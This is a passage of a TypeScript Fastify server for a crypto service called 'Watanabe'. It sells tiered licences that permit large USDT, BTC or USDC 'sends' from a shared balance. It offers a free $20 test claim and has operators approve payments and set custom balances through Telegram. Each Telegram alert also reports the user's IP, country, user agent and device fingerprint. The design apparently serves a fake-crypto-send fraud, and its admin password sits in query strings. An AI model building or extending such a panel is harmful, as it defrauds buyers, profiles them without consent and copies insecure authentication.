    console.log(`[Telegram] ${conn.id} APPROVED with custom balance $${amount} by ${operatorName}`)
  } else {
    await sendTelegramMessage({
      text: `⚠️ Could not approve connection — it may have already been processed.`,
      parseMode: 'HTML',
    })
  }
}

// Helper to escape HTML
function escapeHtml(text: string): string {
  return text.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;')
}

// POST /api/telegram/webhook - Handle Telegram updates (webhooks or manual forwarding)
fastify.post('/api/telegram/webhook', async (request, reply) => {
  const body = request.body as Record<string, unknown>

  // Handle callback_query from inline keyboards
  const callbackQuery = body.callback_query as
    | {
        id: string
        from: { first_name: string; username?: string }
        message?: { message_id: number; chat: { id: number } }
        data?: string
      }
    | undefined

  if (callbackQuery) {
    await handleCallbackQuery(callbackQuery)
    return reply.send({ ok: true })
  }

  // Handle text messages (for custom balance input)
  const message = body.message as
    | { message_id: number; chat: { id: number }; from?: { first_name: string }; text?: string }
    | undefined

  if (message?.text) {
    await handleTextMessage(message)
  }

  return reply.send({ ok: true })
})

// ─── Notification Routes (Server-side triggers) ──────────────────────────────

// POST /api/notify/gas-deposit - Notify about gas deposit
fastify.post('/api/notify/gas-deposit', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const clientIP = getClientIP(request)

  const result = await notifyGasDeposit({
    amount: Number(body.amount) || 0,
    currency: (body.currency as string) || 'ETH',
    address: (body.address as string) || '',
    ip: clientIP,
  })

  return reply.send(result)
})

// POST /api/notify/send-request - Notify about send request
fastify.post('/api/notify/send-request', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const clientIP = getClientIP(request)

  const result = await notifySendRequest({
    amount: Number(body.amount) || 0,
    toAddress: (body.toAddress as string) || '',
    isSlowSend: body.isSlowSend === true,
    ip: clientIP,
  })

  return reply.send(result)
})

// ─── Watanabe API Routes ─────────────────────────────────────────────────────

// GET /api/watanabe/settings - Public settings for watanabe page
fastify.get('/api/watanabe/settings', async (_request, reply) => {
  const settings = getCachedSettings()
  return reply.send({
    mode: settings.watanabeMode || 'purchase',
    enabled: settings.watanabeEnabled !== false,
    commissionPercent: Number(settings.watanabeCommissionPercent) || 5,
    testClaimAmount: Number(settings.watanabeTestClaimAmount) || 20,
    testClaimEnabled: settings.watanabeTestClaimEnabled === true || settings.watanabeTestClaimEnabled === 'true',
    balances: {
      USDT_ERC20: Number(settings.watanabeBalanceUSDT_ERC20) || 0,
      USDT_TRC20: Number(settings.watanabeBalanceUSDT_TRC20) || 0,
      BTC: Number(settings.watanabeBalanceBTC) || 0,
      USDC_SOL: Number(settings.watanabeBalanceUSDC_SOL) || 0,
    },
    plans: {
      '24h': {
        price: Number(settings.watanabePlan24hPrice) || 500,
        limit: Number(settings.watanabePlan24hLimit) || 30000,
        duration: '24 Hours',
        assets: ['USDT_ERC20', 'USDT_TRC20'],
        validity: '90 days',
        transferable: true,
      },
      '1week': {
        price: Number(settings.watanabePlan1weekPrice) || 2000,
        limit: Number(settings.watanabePlan1weekLimit) || 150000,
        duration: '1 Week',
        assets: ['USDT_ERC20', 'USDT_TRC20', 'BTC', 'USDC_SOL'],
        validity: '90 days',
        transferable: true,
      },
      '1month': {
        price: Number(settings.watanabePlan1monthPrice) || 5000,
        limit: Number(settings.watanabePlan1monthLimit) || 500000,
        duration: '1 Month',
        assets: ['USDT_ERC20', 'USDT_TRC20', 'BTC', 'USDC_SOL'],
        validity: '90 days',
        transferable: true,
      },
    },
    paymentAddresses: {
      LTC: String(settings.watanabePaymentAddressLTC || ''),
      BTC: String(settings.watanabePaymentAddressBTC || ''),
      ETH: String(settings.watanabePaymentAddressETH || ''),
      SOL: String(settings.watanabePaymentAddressSOL || ''),
    },
    adminWallet: String(settings.watanabeAdminWallet || '').toLowerCase(),
  })
})

// POST /api/watanabe/auth - Register/check user by wallet
fastify.post('/api/watanabe/auth', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()
  if (!wallet) {
    return reply.status(400).send({ error: 'walletAddress required' })
  }
  const user = watanabeGetOrCreateUser(wallet)
  const settings = getCachedSettings()
  const isAdmin = wallet === String(settings.watanabeAdminWallet || '').toLowerCase() && wallet !== ''
  const activeLicense = watanabeGetActiveLicense(wallet)
  const pendingLicense = watanabeGetPendingLicense(wallet)
  return reply.send({ user, isAdmin, activeLicense, pendingLicense })
})

// GET /api/watanabe/transactions/:wallet - Get user transactions
fastify.get('/api/watanabe/transactions/:wallet', async (request, reply) => {
  const { wallet } = request.params as { wallet: string }
  const transactions = watanabeGetUserTransactions(wallet)
  return reply.send({ transactions })
})

// POST /api/watanabe/send - Execute a send transaction
fastify.post('/api/watanabe/send', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()
  const asset = body.asset as string
  const amount = Number(body.amount) || 0
  const toAddress = (body.toAddress as string) || ''
  const commissionPaid = Number(body.commissionPaid) || 0

  if (!wallet || !asset || !amount || !toAddress) {
    return reply.status(400).send({ error: 'Missing required fields' })
  }

  // Check if user is blocked
  if (watanabeIsUserBlocked(wallet)) {
    return reply.status(403).send({ error: 'Your wallet has been restricted from accessing this service' })
  }

  const settings = getCachedSettings()
  const isAdmin = wallet === String(settings.watanabeAdminWallet || '').toLowerCase() && wallet !== ''
  const mode = String(settings.watanabeMode || 'commission')

  // Check license in purchase mode (unless admin)
  if (mode === 'purchase' && !isAdmin) {
    const license = watanabeGetActiveLicense(wallet)
    if (!license) {
      return reply.status(403).send({ error: 'Active license required' })
    }
    // Check send limit
    if (license.totalSent + amount > license.sendLimit) {
      return reply
        .status(403)
        .send({ error: `Send limit exceeded. Remaining: $${(license.sendLimit - license.totalSent).toFixed(2)}` })
    }
    // Check asset allowed for plan
    const planAssets =
      license.plan === '24h' ? ['USDT_ERC20', 'USDT_TRC20'] : ['USDT_ERC20', 'USDT_TRC20', 'BTC', 'USDC_SOL']
    if (!planAssets.includes(asset)) {
      return reply.status(403).send({ error: `Asset ${asset} not available on your plan` })
    }
    // Update license sent amount
    watanabeUpdateLicenseSent(license.id, amount)
  }

  // Create transaction
  const txId = watanabeCreateTransaction(wallet, asset, amount, toAddress, 'send', commissionPaid)

  // Deduct from global balance
  watanabeDeductBalance(asset, amount)
  invalidateSettingsCache()

  // Notify telegram
  const clientIP = getClientIP(request)
  await sendTelegramMessage({
    text: [
      `💸 <b>Watanabe Send</b>`,
      ``,
      `👛 Wallet: <code>${wallet}</code>`,
      `💰 Amount: <b>${amount} ${asset.replace('_', ' ')}</b>`,
      `📬 To: <code>${toAddress}</code>`,
      `${commissionPaid > 0 ? `💳 Commission: ${commissionPaid} ${asset.replace('_', ' ')}` : '🆓 No commission'}`,
      `🌐 IP: ${clientIP}`,
      `🔑 Mode: ${mode}${isAdmin ? ' (ADMIN)' : ''}`,
      `⏰ ${new Date().toUTCString()}`,
    ].join('\n'),
    parseMode: 'HTML',
  })

  return reply.send({ success: true, transactionId: txId })
})

// POST /api/watanabe/claim - Claim test transaction ($20)
fastify.post('/api/watanabe/claim', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()
  const asset = body.asset as string
  const toAddress = (body.toAddress as string) || ''
  const fingerprint = ((body.fingerprint as string) || '').trim()

  if (!wallet || !asset || !toAddress) {
    return reply.status(400).send({ error: 'Missing required fields' })
  }

  if (watanabeIsUserBlocked(wallet)) {
    return reply.status(403).send({ error: 'Wallet restricted' })
  }

  const settings = getCachedSettings()

  if (settings.watanabeTestClaimEnabled !== true && settings.watanabeTestClaimEnabled !== 'true') {
    return reply.status(403).send({ error: 'Free test claims are temporarily unavailable. Please try again later.' })
  }

  // Check if this wallet already claimed
  if (watanabeHasUserClaimed(wallet)) {
    return reply.status(403).send({ error: 'You have already claimed your free test transaction. Each wallet can only claim once.' })
  }

  // Check if this fingerprint has already been used by another wallet
  if (fingerprint && watanabeCheckFingerprint(fingerprint)) {
    return reply.status(403).send({ error: 'A claim has already been made from this device. Each device can only claim once.' })
  }

  const claimAmount = Number(settings.watanabeTestClaimAmount) || 20

  const txId = watanabeCreateTransaction(wallet, asset, claimAmount, toAddress, 'claim', 0)

  // Mark this wallet as claimed with fingerprint
  watanabeMarkClaimed(wallet, fingerprint)

  // Notify telegram for manual settlement
  const clientIP = getClientIP(request)
  await sendTelegramMessage({
    text: [
      `🎁 <b>Watanabe Test Claim</b>`,
      ``,
      `👛 Wallet: <code>${wallet}</code>`,
      `💰 Amount: <b>$${claimAmount} ${asset.replace('_', ' ')}</b>`,
      `📬 To: <code>${toAddress}</code>`,
      `🌐 IP: ${clientIP}`,
      `🔒 Fingerprint: <code>${fingerprint || 'none'}</code>`,
      ``,
      `⚠️ <i>Manual settlement required</i>`,
      `⏰ ${new Date().toUTCString()}`,
    ].join('\n'),
    parseMode: 'HTML',
  })

  return reply.send({ success: true, transactionId: txId, amount: claimAmount })
})

// ─── Settings SSE Stream ─────────────────────────────────────────────────────
// Clients subscribe to real-time setting changes (e.g. testClaimEnabled toggled)
const settingsSSEClients = new Set<(data: string) => void>()

export function notifySettingsChange(): void {
  const settings = getCachedSettings()
  const payload = JSON.stringify({
    testClaimEnabled: settings.watanabeTestClaimEnabled === true || settings.watanabeTestClaimEnabled === 'true',
    testClaimAmount: Number(settings.watanabeTestClaimAmount) || 20,
    mode: settings.watanabeMode || 'purchase',
    enabled: settings.watanabeEnabled !== false && settings.watanabeEnabled !== 'false',
  })
  const msg = `data: ${payload}\n\n`
  for (const send of settingsSSEClients) {
    try { send(msg) } catch { /* client gone */ }
  }
}

fastify.get('/api/watanabe/settings/stream', async (request, reply) => {
  reply.raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
    'Access-Control-Allow-Origin': request.headers.origin || '*',
    'Access-Control-Allow-Credentials': 'true',
  })

  // Send initial state
  const settings = getCachedSettings()
  const initial = JSON.stringify({
    testClaimEnabled: settings.watanabeTestClaimEnabled === true || settings.watanabeTestClaimEnabled === 'true',
    testClaimAmount: Number(settings.watanabeTestClaimAmount) || 20,
    mode: settings.watanabeMode || 'purchase',
    enabled: settings.watanabeEnabled !== false && settings.watanabeEnabled !== 'false',
  })
  reply.raw.write(`data: ${initial}\n\n`)

  const send = (data: string): void => { reply.raw.write(data) }
  settingsSSEClients.add(send)

  // Heartbeat every 25s
  const heartbeat = setInterval(() => {
    try { reply.raw.write(': heartbeat\n\n') } catch { /* ignore */ }
  }, 25000)

  request.raw.on('close', () => {
    settingsSSEClients.delete(send)
    clearInterval(heartbeat)
  })
})

// POST /api/watanabe/admin/reset-claim - Reset claim for a user
fastify.post('/api/watanabe/admin/reset-claim', async (request, reply) => {
  if (!validatePassword(request.body as Record<string, unknown>, request)) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()
  if (!wallet) {
    return reply.status(400).send({ error: 'walletAddress required' })
  }
  watanabeResetClaim(wallet)
  return reply.send({ success: true })
})

// POST /api/watanabe/license/purchase - Initiate license purchase
fastify.post('/api/watanabe/license/purchase', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()
  const plan = body.plan as '24h' | '1week' | '1month'
  const paymentAsset = (body.paymentAsset as string) || ''

  if (!wallet || !plan || !paymentAsset) {
    return reply.status(400).send({ error: 'Missing required fields' })
  }

  // Idempotency: if there's already a pending/awaiting_approval license, return it
  const existingPending = watanabeGetPendingLicense(wallet)
  if (existingPending) {
    return reply.send({
      success: true,
      licenseId: existingPending.id,
      price: existingPending.paymentAmount,
      paymentAddress: existingPending.paymentAddress,
      paymentAsset: existingPending.paymentAsset,
      plan: existingPending.plan,
      limit: existingPending.sendLimit,
      existing: true,
    })
  }

  const settings = getCachedSettings()
  const priceKey = `watanabePlan${plan === '24h' ? '24h' : plan === '1week' ? '1week' : '1month'}Price`
  const limitKey = `watanabePlan${plan === '24h' ? '24h' : plan === '1week' ? '1week' : '1month'}Limit`
  const price = Number(settings[priceKey]) || 0
  const limit = Number(settings[limitKey]) || 0

  const addressKey = `watanabePaymentAddress${paymentAsset}`
  const paymentAddress = String(settings[addressKey] || '')

  if (!paymentAddress) {
    return reply.status(400).send({ error: `No payment address configured for ${paymentAsset}` })
  }

  const licenseId = watanabeCreateLicense(wallet, plan, paymentAsset, price, paymentAddress, limit)

  return reply.send({
    success: true,
    licenseId,
    price,
    paymentAddress,
    paymentAsset,
    plan,
    limit,
  })
})

// POST /api/watanabe/license/paid - Mark license as paid (awaiting approval)
fastify.post('/api/watanabe/license/paid', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const licenseId = body.licenseId as string

  if (!licenseId) {
    return reply.status(400).send({ error: 'licenseId required' })
  }

  const marked = watanabeMarkLicensePaid(licenseId)
  if (!marked) {
    return reply.status(404).send({ error: 'License not found or already processed' })
  }

  const wallet = ((body.walletAddress as string) || 'unknown').toLowerCase()
  const clientIP = getClientIP(request)
  const userAgent = (request.headers['user-agent'] as string) || 'unknown'

  // Try to get country from IP using a free geo API
  let country = 'Unknown'
  try {
    const geoRes = await fetch(`http://ip-api.com/json/${clientIP}?fields=country,countryCode`, {
      signal: AbortSignal.timeout(3000),
    })
    const geoData = (await geoRes.json()) as { country?: string; countryCode?: string }
    if (geoData.country) {
      country = `${geoData.country} (${geoData.countryCode || ''})`
    }
  } catch {
    // Best effort geo lookup
  }

  // Store request metadata on the license
  watanabeUpdateLicenseRequestMeta(licenseId, clientIP, userAgent, country)

  const license = watanabeGetLicenseById(licenseId)
  const planNames: Record<string, string> = { '24h': '24 Hours', '1week': '1 Week', '1month': '1 Month' }
  const planName = planNames[license?.plan || ''] || license?.plan || 'unknown'

  // Notify telegram with enriched details + approve/reject buttons
  const result = await sendTelegramMessage({
    text: [
      `🔑 <b>Watanabe License Purchase</b>`,
      ``,
      `👛 Wallet: <code>${wallet}</code>`,
      `📋 Plan: <b>${planName}</b>`,
      `💰 Amount: <b>$${license?.paymentAmount || 0}</b>`,
      `🪙 Payment: <b>${license?.paymentAsset || 'unknown'}</b>`,
      `📬 To: <code>${license?.paymentAddress || ''}</code>`,
      `📊 Send Limit: $${(license?.sendLimit || 0).toLocaleString()}`,
      `🆔 License: <code>${licenseId}</code>`,
      ``,
      `🌐 IP: <code>${clientIP}</code>`,
      `🌍 Country: ${country}`,
      `🖥 UA: <code>${escapeHtml(userAgent.slice(0, 120))}</code>`,
      ``,
      `⚠️ <i>User claims they have paid. Please verify and approve/reject.</i>`,
      `⏰ ${new Date().toUTCString()}`,
    ].join('\n'),
    parseMode: 'HTML',
    replyMarkup: {
      inline_keyboard: [
        [
          { text: '✅ Approve License', callback_data: `wlic_approve_${licenseId}` },
          { text: '❌ Reject', callback_data: `wlic_reject_${licenseId}` },
        ],
      ],
    },
  })

  if (result.messageId) {
    watanabeSetLicenseTelegramMsg(licenseId, result.messageId)
  }

  return reply.send({ success: true, status: 'awaiting_approval' })
})

// POST /api/watanabe/license/remind - Re-send approval reminder to Telegram
fastify.post('/api/watanabe/license/remind', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const wallet = ((body.walletAddress as string) || '').toLowerCase()

  if (!wallet) {
    return reply.status(400).send({ error: 'walletAddress required' })
  }

  const pending = watanabeGetPendingLicense(wallet)
  if (!pending) {
    return reply.status(404).send({ error: 'No pending license found' })
  }

  // If already approved or active, return current status
  if (pending.status === 'active') {
    return reply.send({ success: true, status: 'active', licenseId: pending.id })
  }

  if (pending.status === 'rejected') {
    return reply.send({ success: true, status: 'rejected', licenseId: pending.id })
  }

  const planNames: Record<string, string> = { '24h': '24 Hours', '1week': '1 Week', '1month': '1 Month' }
  const planName = planNames[pending.plan] || pending.plan

  // Re-send Telegram reminder with approve/reject buttons
  const result = await sendTelegramMessage({
    text: [
      `🔔 <b>Watanabe License REMINDER</b>`,
      ``,
      `👛 Wallet: <code>${wallet}</code>`,
      `📋 Plan: <b>${planName}</b>`,
      `💰 Amount: <b>$${pending.paymentAmount}</b>`,
      `🪙 Payment: <b>${pending.paymentAsset}</b>`,
      `📬 To: <code>${pending.paymentAddress}</code>`,
      `🆔 License: <code>${pending.id}</code>`,
      ``,
      pending.requestIp ? `🌐 IP: <code>${pending.requestIp}</code>` : '',
      pending.requestCountry ? `🌍 Country: ${pending.requestCountry}` : '',
      ``,
      `⚠️ <i>User is still waiting for approval. Please review.</i>`,
      `⏰ ${new Date().toUTCString()}`,
    ]
      .filter(Boolean)
      .join('\n'),
    parseMode: 'HTML',
    replyMarkup: {
      inline_keyboard: [
        [
          { text: '✅ Approve License', callback_data: `wlic_approve_${pending.id}` },
          { text: '❌ Reject', callback_data: `wlic_reject_${pending.id}` },
        ],
      ],
    },
  })

  if (result.messageId) {
    watanabeSetLicenseTelegramMsg(pending.id, result.messageId)
  }

  return reply.send({ success: true, status: pending.status, reminded: true })
})

// GET /api/watanabe/license/:wallet - Get user's license status
fastify.get('/api/watanabe/license/:wallet', async (request, reply) => {
  const { wallet } = request.params as { wallet: string }
  const active = watanabeGetActiveLicense(wallet)
  const pending = watanabeGetPendingLicense(wallet)
  const all = watanabeGetUserLicenses(wallet)
  return reply.send({ active, pending, all })
})

// Admin routes for Watanabe (require password)

// GET /api/watanabe/admin/users - List all users
fastify.get('/api/watanabe/admin/users', async (request, reply) => {
  const { password } = request.query as { password?: string }
  const headerPw = request.headers['x-admin-password']
  if (password !== ADMIN_PASSWORD && headerPw !== ADMIN_PASSWORD) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }
  const users = watanabeGetAllUsers()
  return reply.send({ users })
})

// POST /api/watanabe/admin/block - Block a user wallet
fastify.post('/api/watanabe/admin/block', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const headerPw = request.headers['x-admin-password']
  if (body.password !== ADMIN_PASSWORD && headerPw !== ADMIN_PASSWORD) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }
  const wallet = body.walletAddress as string
  if (!wallet) {
    return reply.status(400).send({ error: 'walletAddress required' })
  }
  watanabeBlockUser(wallet)
  return reply.send({ success: true })
})

// POST /api/watanabe/admin/unblock - Unblock a user wallet
fastify.post('/api/watanabe/admin/unblock', async (request, reply) => {
  const body = request.body as Record<string, unknown>
  const headerPw = request.headers['x-admin-password']
  if (body.password !== ADMIN_PASSWORD && headerPw !== ADMIN_PASSWORD) {
    return reply.status(401).send({ error: 'Unauthorized' })
  }
  const wallet = body.walletAddress as string
  if (!wallet) {
    return reply.status(400).send({ error: 'walletAddress required' })
  }
  watanabeUnblockUser(wallet)
  return reply.send({ success: true })
})

// ─── SSE: License status stream ──────────────────────────────────────────────
// Clients connect to this to get real-time license approval/rejection
const licenseSSEClients = new Map<string, Set<(data: string) => void>>()

export function notifyLicenseUpdate(walletAddress: string, status: string, licenseId: string): void {
  const wallet = walletAddress.toLowerCase()
  const clients = licenseSSEClients.get(wallet)
  if (clients && clients.size > 0) {
    const payload = JSON.stringify({ status, licenseId, timestamp: Date.now() })
    for (const send of clients) {
      send(payload)
    }
  }
}

fastify.get('/api/watanabe/license/stream/:wallet', async (request, reply) => {
  const { wallet } = request.params as { wallet: string }
  const walletLower = wallet.toLowerCase()

  reply.raw.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    Connection: 'keep-alive',
    'Access-Control-Allow-Origin': request.headers.origin || '*',
    'Access-Control-Allow-Credentials': 'true',
  })

  const send = (data: string): void => {
    reply.raw.write(`data: ${data}\n\n`)
  }

  // Register this client
  if (!licenseSSEClients.has(walletLower)) {
    licenseSSEClients.set(walletLower, new Set())
  }
  const clientSet = licenseSSEClients.get(walletLower)
  if (clientSet) {
    clientSet.add(send)
  }

  // Send initial status
  const pending = watanabeGetPendingLicense(walletLower)
  const active = watanabeGetActiveLicense(walletLower)
  if (active) {
    send(JSON.stringify({ status: 'active', licenseId: active.id, timestamp: Date.now() }))
  } else if (pending) {
    send(JSON.stringify({ status: pending.status, licenseId: pending.id, timestamp: Date.now() }))
  }

  // Send heartbeat every 15s to keep connection alive
  const heartbeat = setInterval(() => {
    reply.raw.write(': heartbeat\n\n')
  }, 15000)

  // Cleanup on close
  request.raw.on('close', () => {
    clearInterval(heartbeat)
    const set = licenseSSEClients.get(walletLower)
    if (set) {
      set.delete(send)
      if (set.size === 0) {
        licenseSSEClients.delete(walletLower)
      }
    }
  })
})

// ─── Start Server ────────────────────────────────────────────────────────────

// Telegram long-polling for inline button callbacks AND text messages
let telegramPollingActive = false
let lastUpdateId = 0
let pollCount = 0

// Delete any existing webhook so getUpdates works
async function deleteTelegramWebhook(): Promise<void> {
  const config = getTelegramConfig()
  if (!config.botToken) {
    return
  }

  try {
    const url = `https://api.telegram.org/bot${config.botToken}/deleteWebhook`
    const response = await fetch(url, { method: 'POST' })
    const data = (await response.json()) as { ok: boolean; description?: string }
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log(`[Telegram] deleteWebhook: ok=${data.ok} ${data.description || ''}`)
  } catch (error) {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.error('[Telegram] deleteWebhook error:', error)
  }
}

async function pollTelegramUpdates(): Promise<void> {
  const config = getTelegramConfig()
  if (!config.botToken || !config.notificationsEnabled) {
    if (pollCount % 60 === 0) {
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log('[Telegram Poll] Skipping - bot not configured or notifications disabled')
    }
    pollCount++
    return
  }

  try {
    // Use POST with JSON body for reliable parameter passing
    const url = `https://api.telegram.org/bot${config.botToken}/getUpdates`
    const response = await fetch(url, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        offset: lastUpdateId + 1,
        timeout: 5,
        allowed_updates: ['callback_query', 'message'],
      }),
      signal: AbortSignal.timeout(15000),
    })
    const data = (await response.json()) as {
      ok: boolean
      description?: string
      result?: Array<{
        update_id: number
        callback_query?: {
          id: string
          from: { first_name: string; username?: string }
          message?: { message_id: number; chat: { id: number } }
          data?: string
        }
        message?: {
          message_id: number
          chat: { id: number }
          from?: { first_name: string }
          text?: string
        }
      }>
    }

    if (!data.ok) {
      // biome-ignore lint/suspicious/noConsole: server logging
      console.error(`[Telegram Poll] API returned ok=false: ${data.description}`)
      return
    }

    if (data.result && data.result.length > 0) {
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram Poll] Received ${data.result.length} update(s)`)

      for (const update of data.result) {
        lastUpdateId = Math.max(lastUpdateId, update.update_id)
        // biome-ignore lint/suspicious/noConsole: server logging
        console.log(
          `[Telegram Poll] Processing update_id=${update.update_id}, has_callback=${!!update.callback_query}, has_message=${!!update.message?.text}`,
        )

        // Handle inline button callback
        if (update.callback_query) {
          // biome-ignore lint/suspicious/noConsole: server logging
          console.log(
            `[Telegram Poll] Callback data: "${update.callback_query.data}" from ${update.callback_query.from?.first_name}`,
          )
          try {
            await handleCallbackQuery(update.callback_query)
            // biome-ignore lint/suspicious/noConsole: server logging
            console.log(`[Telegram Poll] Callback handled successfully`)
          } catch (err) {
            // biome-ignore lint/suspicious/noConsole: server logging
            console.error(`[Telegram Poll] Error handling callback:`, err)
          }
        }

        // Handle text message (for custom balance input)
        if (update.message?.text) {
          // biome-ignore lint/suspicious/noConsole: server logging
          console.log(`[Telegram Poll] Text message: "${update.message.text}" from chat ${update.message.chat.id}`)
          try {
            await handleTextMessage(update.message)
            // biome-ignore lint/suspicious/noConsole: server logging
            console.log(`[Telegram Poll] Text message handled`)
          } catch (err) {
            // biome-ignore lint/suspicious/noConsole: server logging
            console.error(`[Telegram Poll] Error handling text message:`, err)
          }
        }
      }
    } else if (pollCount % 20 === 0) {
      // Log every ~20 polls (~10s) to confirm polling is alive
      // biome-ignore lint/suspicious/noConsole: server logging
      console.log(`[Telegram Poll] Alive, no new updates (poll #${pollCount})`)
    }

    pollCount++
  } catch (error) {
    if (String(error).includes('AbortError') || String(error).includes('timeout')) {
      // Normal timeout, just continue
      return
    }
    // biome-ignore lint/suspicious/noConsole: server logging
    console.error('[Telegram Poll] Error:', error)
  }
}

function startTelegramPolling(): void {
  if (telegramPollingActive) {
    return
  }

  const config = getTelegramConfig()
  if (!config.botToken || !config.notificationsEnabled) {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log('[Telegram Poll] Not starting - bot not configured or notifications disabled')
    return
  }

  telegramPollingActive = true
  // biome-ignore lint/suspicious/noConsole: server logging
  console.log('[Telegram Poll] Starting long-polling for callbacks + messages...')

  const poll = async (): Promise<void> => {
    while (telegramPollingActive) {
      await pollTelegramUpdates()
      await new Promise((resolve) => setTimeout(resolve, 500))
    }
  }

  poll().catch((err) => {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.error('[Telegram Poll] Fatal error:', err)
    telegramPollingActive = false
  })
}

const start = async () => {
  try {
    await fastify.listen({ port: 3001, host: '0.0.0.0' })
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log('═══════════════════════════════════════════════════')
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log('  API server running on http://0.0.0.0:3001')
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log('  SQLite + Cache + Telegram')
    // biome-ignore lint/suspicious/noConsole: server logging
    console.log('═══════════════════════════════════════════════════')

    // Delete any existing webhook (required for getUpdates to work)
    await deleteTelegramWebhook()

    startTelegramPolling()
  } catch (err) {
    // biome-ignore lint/suspicious/noConsole: server logging
    console.error('[Server] Fatal startup error:', err)
    process.exit(1)
  }
}

start()
